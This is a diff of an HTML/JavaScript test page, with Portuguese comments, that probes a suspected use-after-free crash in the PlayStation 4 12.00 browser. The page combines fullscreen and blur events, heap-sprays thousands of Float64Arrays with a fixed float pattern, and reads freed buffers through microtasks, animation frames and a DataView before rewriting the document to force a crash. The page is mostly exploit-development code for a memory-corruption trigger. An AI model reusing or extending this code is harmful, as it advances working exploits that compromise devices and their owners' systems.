@@ -1,66 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 UAF Confirmation</title>
+    <meta charset="UTF-8">
+    <title>PS4 FullScreen+Blur Crash - Reentrancy Tests</title>
 </head>
 <body>
 
-<h2>PS4 12.00 - UAF Confirmation</h2>
+<h1>PS4 12.00 - Reentrancy / UAF Investigation</h1>
 
-<button onclick="runTest(0)">1. Baseline</button>
-<button onclick="runTest(1)">2. Keep Alive (No GC)</button>
-<button onclick="runTest(2)">3. Force GC</button>
-
-<div id="log"></div>
+<button onclick="runCrashTest()">Run Test</button>
+<div id="log" style="white-space:pre; font-family:monospace;"></div>
 
 <script>
 const PATTERN = 2.121995791e-314;
 
-let globalKeepAlive = null;
+function log(msg) {
+    const el = document.getElementById("log");
+    el.textContent += msg + "\n";
+}
 
-function runTest(mode) {
-    const log = document.getElementById("log");
-    log.innerHTML = "<p>Running... Press OPTIONS</p>";
+function runCrashTest() {
+    log("Starting... Press OPTIONS");
 
     let controllers = [];
 
-    // Passo 1 (inalterado)
+    // PASSO 1 (inalterado)
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
-    // 🔴 Controle de retenção
-    if (mode === 1) {
-        // KEEP ALIVE → impede GC
-        globalKeepAlive = controllers;
-    }
+    // PASSO 2 (inalterado)
+    const elem = document.documentElement;
+    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
 
-    // Fullscreen (inalterado)
-    document.documentElement.webkitRequestFullscreen?.();
-
+    // PASSO 3 (inalterado)
     window.onblur = function() {
+        log("[onblur] triggered");
 
-        if (mode === 2) {
-            // 🔥 FORÇA GC
-            controllers = null;
-
-            for (let i = 0; i < 20000; i++) {
-                new ArrayBuffer(0x10000);
+        // =========================
+        // 🔴 TESTE 1 — MICROTASK
+        // =========================
+        Promise.resolve().then(() => {
+            try {
+                log("[Microtask] controllers[0][0] = " + controllers[0][0]);
+            } catch(e) {
+                log("[Microtask ERROR] " + e);
             }
-        }
+        });
 
-        if (mode === 0) {
-            // Baseline (inalterado)
-        }
+        // =========================
+        // 🔴 TESTE 2 — RAF (reentrancy)
+        // =========================
+        requestAnimationFrame(() => {
+            try {
+                log("[RAF] controllers[0][0] = " + controllers[0][0]);
+            } catch(e) {
+                log("[RAF ERROR] " + e);
+            }
+        });
 
-        if (mode === 1) {
-            // KEEP ALIVE → NÃO liberar
-        }
+        // =========================
+        // 🔴 TESTE 3 — BUFFER ACCESS
+        // =========================
+        requestAnimationFrame(() => {
+            try {
+                let buf = controllers[0].buffer;
+                log("[BUFFER] byteLength = " + buf.byteLength);
+            } catch(e) {
+                log("[BUFFER ERROR] " + e);
+            }
+        });
 
-        // Spray mantido
+        // =========================
+        // 🔴 TESTE 4 — DATAVIEW (low-level)
+        // =========================
+        requestAnimationFrame(() => {
+            try {
+                let dv = new DataView(controllers[0].buffer);
+                let val = dv.getUint32(0, true);
+                log("[DATAVIEW] value = " + val);
+            } catch(e) {
+                log("[DATAVIEW ERROR] " + e);
+            }
+        });
+
+        // =========================
+        // PASSO 4 (spray mantido)
+        // =========================
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
@@ -68,11 +96,14 @@ function runTest(mode) {
             spray.push(p);
         }
 
-        // Gatilho crítico (inalterado)
+        // =========================
+        // PASSO FINAL (CRÍTICO - NÃO ALTERADO)
+        // =========================
         setTimeout(() => {
             document.open();
-            document.write("<h1>Crash</h1>");
+            document.write('<html><body><h1>Crash</h1></body></html>');
             document.close();
+
             setTimeout(() => location.reload(), 500);
         }, 3000);
     };
